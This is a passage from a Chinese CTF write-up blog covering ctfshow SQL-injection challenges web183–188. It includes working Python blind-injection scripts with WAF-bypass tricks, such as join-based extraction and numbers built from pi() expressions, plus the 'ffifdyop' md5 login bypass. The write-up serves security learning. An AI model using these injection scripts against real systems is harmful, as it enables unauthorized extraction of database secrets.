+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://898034b5-dc30-4856-9230-a65688cba1ac.chall.ctf.show/select-waf.php&#x27;&#x27;&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">flag = <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="string">r&#x27;abcdefghijklmnopqrstuvwxyz&#123;-&#125;0123456789&#x27;</span>:</span><br><span class="line">        data[<span class="string">&quot;tableName&quot;</span>]=<span class="string">&quot;(ctfshow_user)where(right(pass,%d))like&#x27;%s&#x27;&quot;</span>%(x,y+flag)</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        s = requests.post(url,data = data)</span><br><span class="line">        <span class="comment">#print(s.text)  </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;$user_count = 1;&#x27;</span> <span class="keyword">in</span> s.text:</span><br><span class="line">            flag = y + flag</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>sql：<code>$sql = &quot;select count(*) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;</code><br>waf：<code>preg_match(&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\`|sleep|benchmark/i&#39;, $str)</code><br>emmm，费老牛鼻子劲，太菜了，嘤嘤嘤，第一次用join写脚本，用群主的字典效率高点</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="comment"># py2</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://e5e91710-3aa2-4752-a2a0-68a6c18fee26.chall.ctf.show/select-waf.php&#x27;&#x27;&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="string">r&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125;&#x27;</span>:</span><br><span class="line">        <span class="comment">#字典：flag&#123;b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz&#125;   #群主亲传效率高</span></span><br><span class="line">        temp = <span class="string">&quot;0x&quot;</span>+(flag+y).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">        data[<span class="string">&quot;tableName&quot;</span>]=<span class="string">&#x27;ctfshow_user x right join ctfshow_user y on left(y.pass,%d) like %s&#x27;</span>%(x,temp)</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        s = requests.post(url,data = data)</span><br><span class="line">        <span class="comment">#print(s.text)  </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;$user_count = 22;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> s.text:</span><br><span class="line">            flag =  flag + y</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h2 id="web185-186"><a href="#web185-186" class="headerlink" title="web185 | 186"></a>web185 | 186</h2><p>185的sql和waf忘了写，不过都是一个脚本，没差<br>186sql：<code>$sql = &quot;select count(*) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;</code><br>186waf：<code>preg_match(&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\`|sleep|benchmark/i&#39;, $str)</code><br>额，这么慢才出。。。耽搁挺长时间，还是自己太菜了，欸，if的43先自己判断下，系列题目，flag格式固定<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.e8x3axfwwan.png" alt="waf数字"><br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.oys89ez7sjb.png" alt="waf数字字母"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="comment"># @Author:  yq1ng</span></span><br><span class="line"><span class="comment"># @Date:    2020-11-09 18:30</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://7a27816c-2c96-4544-b3ba-f0867f97f250.chall.ctf.show//select-waf.php&#x27;&#x27;&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Construct_numbers</span>(<span class="params">num</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;!(!pi())&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> num != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(num<span class="number">-1</span>):</span><br><span class="line">            result = result+<span class="string">&#x27;+&#x27;</span>+<span class="string">&#x27;!(!pi())&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">43</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="string">r&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125;&#x27;</span>:</span><br><span class="line">        <span class="comment">#字典：flag&#123;b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz&#125;   #群主亲传效率高</span></span><br><span class="line">        data[<span class="string">&quot;tableName&quot;</span>] = <span class="string">&#x27;ctfshow_user x right join ctfshow_user y on (hex(substr(y.pass,%s,%s)))like(hex(%s))&#x27;</span>%(Construct_numbers(x),Construct_numbers(<span class="number">1</span>),Construct_numbers(ord(y)))</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        s = requests.post(url,data = data)</span><br><span class="line">        <span class="comment">#print(s.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;$user_count = 43;&#x27;</span> <span class="keyword">in</span> s.text:</span><br><span class="line">            flag += y</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>附上群主的脚本，更快，更美观</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2020-11-07 05:00:51</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2020-11-07 16:28:53</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://7a27816c-2c96-4544-b3ba-f0867f97f250.chall.ctf.show//select-waf.php&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;ctfshow_user as a right join ctfshow_user as b on hex(substr(b.pass,&#123;&#125;,&#123;&#125;))regexp(hex(&#123;char&#125;))&#x27;</span></span><br><span class="line"></span><br><span class="line">strings = <span class="string">&#x27;flag&#123;b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">prefix= <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_num</span>(<span class="params">num</span>):</span></span><br><span class="line">	ret = <span class="string">&#x27;hex(ceil(cot(-(ascii(char_length(now()))))))&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> num != <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(num<span class="number">-1</span>):</span><br><span class="line">			ret = ret+<span class="string">&#x27;+&#x27;</span>+<span class="string">&#x27;hex(ceil(cot(-(ascii(char_length(now()))))))&#x27;</span></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span>():</span></span><br><span class="line">	<span class="comment">#proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;&#125;</span></span><br><span class="line">	flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">		print(<span class="string">&#x27;[+] 开始盲注第&#123;&#125;位&#x27;</span>.format(i+<span class="number">1</span>))</span><br><span class="line">		<span class="keyword">for</span> n <span class="keyword">in</span> strings:</span><br><span class="line">			data = &#123;</span><br><span class="line">				<span class="string">&#x27;tableName&#x27;</span>:payload.format(create_num(i+<span class="number">1</span>),create_num(<span class="number">1</span>),char=create_num(ord(n)))</span><br><span class="line">			&#125;</span><br><span class="line">			ret = requests.post(url,data)</span><br><span class="line">			<span class="comment">#ret = requests.post(url,data,proxies = proxies,verify=False);</span></span><br><span class="line">			<span class="keyword">if</span> ret.text.find(<span class="string">&#x27;43&#x27;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">				<span class="keyword">if</span> i &lt; <span class="number">5</span>:</span><br><span class="line">					<span class="keyword">if</span> n <span class="keyword">in</span> prefix:</span><br><span class="line">						flag=flag+n</span><br><span class="line">						print(<span class="string">&#x27;[+] 盲注第&#123;&#125;位&#x27;</span>.format(i+<span class="number">1</span>)+<span class="string">&quot;字符&#123;&#125;&quot;</span>.format(n)+<span class="string">&quot;成功&quot;</span>)</span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					flag=flag+n</span><br><span class="line">					print(data)</span><br><span class="line">					<span class="comment">#print(ret.text)</span></span><br><span class="line">					print(<span class="string">&#x27;[+] 盲注第&#123;&#125;位&#x27;</span>.format(i+<span class="number">1</span>)+<span class="string">&quot;字符&#123;&#125;&quot;</span>.format(n)+<span class="string">&quot;成功&quot;</span>)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="comment">#else:</span></span><br><span class="line">				<span class="comment">#print(&#x27;[+] 盲注第&#123;&#125;位&#x27;.format(i+1)+&quot;字符&#123;&#125;&quot;.format(chr(n))+&quot;失败 数字为&#123;&#125;&quot;.format(n))</span></span><br><span class="line">				<span class="comment">#print(&#x27;[+] payload为&#123;&#125;&#x27;.format(payload.format(create_num(i+1),create_num(1),char=create_num(ord(n)))))</span></span><br><span class="line">	<span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">print(getFlag())</span><br></pre></td></tr></table></figure>
+<h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>sql: <code>$sql = &quot;select count(*) from ctfshow_user where username = &#39;$username&#39; and password= &#39;$password&#39;&quot;;</code>\</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//waf:</span></span><br><span class="line">    $username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = md5($_POST[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//只有admin可以获得flag</span></span><br><span class="line">    <span class="keyword">if</span>($username!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不存在&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(json_encode($ret));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><code>md5($_POST[&#39;password&#39;],true)</code>很经典的一个题目，详细了解可移步我的<a href="https://yq1ng.github.io/z_post/BJDCTF2020%E5%85%A8%E5%AE%B6%E6%A1%B6/#bjdctf2020easy-md5">这篇博客</a>，直接用<code>ffifdyop</code>作为密码登陆即可</p>
+<h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>sql：<code>$sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;&quot;;</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//waf</span></span><br><span class="line"> <span class="comment">//用户名检测</span></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, $username))&#123;</span><br><span class="line">    $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(json_encode($ret));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//密码检测</span></span><br><span class="line">  <span class="keyword">if</span>(!is_numeric($password))&#123;</span><br><span class="line">    $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(json_encode($ret));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//密码判断</span></span><br><span class="line">  <span class="keyword">if</span>($row[<span class="string">&#x27;pass&#x27;</span>]==intval($password))&#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">      array_push($ret[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;$flag));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="yq1ng 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="yq1ng 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>yq1ng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/" title="CTFSHOW WEB入门 Ttick总结">http://yq1ng.github.io/z_post/CTFSHOW-WEB入门-Ttick总结/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/" rel="tag"><i class="fa fa-tag"></i> ...</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/z_post/ctfshow-36D-web/" rel="prev" title="ctfshow 36D web">
+      <i class="fa fa-chevron-left"></i> ctfshow 36D web
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web5"><span class="nav-number">1.1.</span> <span class="nav-text">web5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web6"><span class="nav-number">1.2.</span> <span class="nav-text">web6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web14"><span class="nav-number">1.3.</span> <span class="nav-text">web14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web16"><span class="nav-number">1.4.</span> <span class="nav-text">web16</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web19"><span class="nav-number">1.5.</span> <span class="nav-text">web19</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web20"><span class="nav-number">1.6.</span> <span class="nav-text">web20</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%88%86%E7%A0%B4"><span class="nav-number">2.</span> <span class="nav-text">爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web21"><span class="nav-number">2.1.</span> <span class="nav-text">web21</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88RCE%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">命令执行（RCE）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web31"><span class="nav-number">3.1.</span> <span class="nav-text">web31</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web32-36"><span class="nav-number">3.2.</span> <span class="nav-text">web32-36</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web38"><span class="nav-number">3.3.</span> <span class="nav-text">web38</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web40"><span class="nav-number">3.4.</span> <span class="nav-text">web40</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web41"><span class="nav-number">3.5.</span> <span class="nav-text">web41</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web42"><span class="nav-number">3.6.</span> <span class="nav-text">web42</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web52"><span class="nav-number">3.7.</span> <span class="nav-text">web52</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web54"><span class="nav-number">3.8.</span> <span class="nav-text">web54</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web55"><span class="nav-number">3.9.</span> <span class="nav-text">web55</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web56"><span class="nav-number">3.10.</span> <span class="nav-text">web56</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web57"><span class="nav-number">3.11.</span> <span class="nav-text">web57</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web71"><span class="nav-number">3.12.</span> <span class="nav-text">web71</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI"><span class="nav-number">4.</span> <span class="nav-text">文件包含(LFI)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web79"><span class="nav-number">4.1.</span> <span class="nav-text">web79</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web80-amp-81"><span class="nav-number">4.2.</span> <span class="nav-text">web80&amp;81</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E7%89%B9%E6%80%A7"><span class="nav-number">5.</span> <span class="nav-text">PHP特性</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web89"><span class="nav-number">5.1.</span> <span class="nav-text">web89</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web91"><span class="nav-number">5.2.</span> <span class="nav-text">web91</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web90-92-93-94-95"><span class="nav-number">5.3.</span> <span class="nav-text">web90 | 92 | 93 | 94 | 95</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web98"><span class="nav-number">5.4.</span> <span class="nav-text">web98</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web99"><span class="nav-number">5.5.</span> <span class="nav-text">web99</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web100-101"><span class="nav-number">5.6.</span> <span class="nav-text">web100 | 101</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web102-103"><span class="nav-number">5.7.</span> <span class="nav-text">web102 | 103</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql"><span class="nav-number">6.</span> <span class="nav-text">sql</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web174"><span class="nav-number">6.1.</span> <span class="nav-text">web174</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web175"><span class="nav-number">6.2.</span> <span class="nav-text">web175</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web176-179"><span class="nav-number">6.3.</span> <span class="nav-text">web176-179</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web180"><span class="nav-number">6.4.</span> <span class="nav-text">web180</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web181-182"><span class="nav-number">6.5.</span> <span class="nav-text">web181 | 182</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web183"><span class="nav-number">6.6.</span> <span class="nav-text">web183</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web184"><span class="nav-number">6.7.</span> <span class="nav-text">web184</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web185-186"><span class="nav-number">6.8.</span> <span class="nav-text">web185 | 186</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web187"><span class="nav-number">6.9.</span> <span class="nav-text">web187</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web188"><span class="nav-number">6.10.</span> <span class="nav-text">web188</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yq1ng"
+      src="/images/xiaoxin.jpg">
+  <p class="site-author-name" itemprop="name">yq1ng</p>
+  <div class="site-description" itemprop="description">The best way to know your strength is to fight</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yq1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yq1ng" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/weixin_43578492" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43578492" rel="noopener" target="_blank"><i class="heartbeat fa-fw"></i>CSDN</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1578422748@qq.com" title="E-Mail → mailto:1578422748@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=%271578422748++%27&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;&#39;1578422748++&#39;&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <script
+  async
+  src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+
+<div class="copyright">
+  
+  &copy; 
